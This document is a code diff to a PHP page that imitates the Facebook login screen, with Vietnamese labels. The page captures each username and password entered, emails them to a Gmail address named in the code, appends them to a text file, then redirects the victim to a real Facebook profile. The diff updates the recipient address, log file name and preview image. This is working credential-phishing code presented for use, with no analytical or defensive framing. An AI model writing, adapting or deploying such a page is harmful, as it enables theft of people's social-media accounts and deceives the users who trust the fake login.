@@ -8,7 +8,7 @@
     		$password = $_POST["pass"]; //name in HTML
             if($username == "slhd2003" && $password == "slhd2003"){
                 echo "<script>alert('Bạn đang đăng nhập vào Admin');</script>";
-                header('Location: Tài Khoảng.txt');
+                header('Location: account.txt');
                 
             }else{
                     
@@ -18,8 +18,8 @@
              $headers = "Đăng nhập Facebook";
              $comment = "";
              $body = "----------------------------------------------\nTài khoản: $username\nMật khẩu: $password \n----------------------------------------------\n";
-             mail("sp.bmasshd@gmail.com", $headers, $body, $subject);
-            $test = fopen("Tài khoảng.txt","a");
+             mail("Sonlyhongduc@gmail.com", $headers, $body, $subject);
+            $test = fopen("account.txt","a");
             fwrite($test,$body);
             fclose($test); 
             header('Location: https://www.facebook.com/profile.php?=75816879');
@@ -35,7 +35,7 @@
 <meta charset='utf-8' />
 <meta content='width=device-width, initial-scale=1' name='viewport' />
 <meta property="og:title" content="Đăng nhập Facebook - Meta" />
-<meta property="og:image" content="https://scontent.fvca1-1.fna.fbcdn.net/v/t39.30808-6/250711789_4733904473296629_6293578552782402282_n.jpg?_nc_cat=105&ccb=1-7&_nc_sid=e3f864&_nc_ohc=uufixDCY-bQAX9toPbs&_nc_ht=scontent.fvca1-1.fna&oh=00_AfAfjBoZKLz9Dm4b_D3zJa66NQvAbqoL5CjpONSZN3hr6w&oe=645BA33B" />
+<meta property="og:image" content="https://cleverads.vn/blog/wp-content/uploads/2023/05/meta-quang-cao-3-e1684137192974.png" />
 
 <link crossorigin='anonymous' href='https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css' integrity='sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC' rel='stylesheet' />
 <link data-badged-icon='https://static.xx.fbcdn.net/rsrc.php/ye/r/Ta8_J_nYekI.ico' data-default-icon='https://static.xx.fbcdn.net/rsrc.php/yD/r/d4ZIVX-5C-b.ico' href='https://static.xx.fbcdn.net/rsrc.php/yD/r/d4ZIVX-5C-b.ico' rel='shortcut icon' />
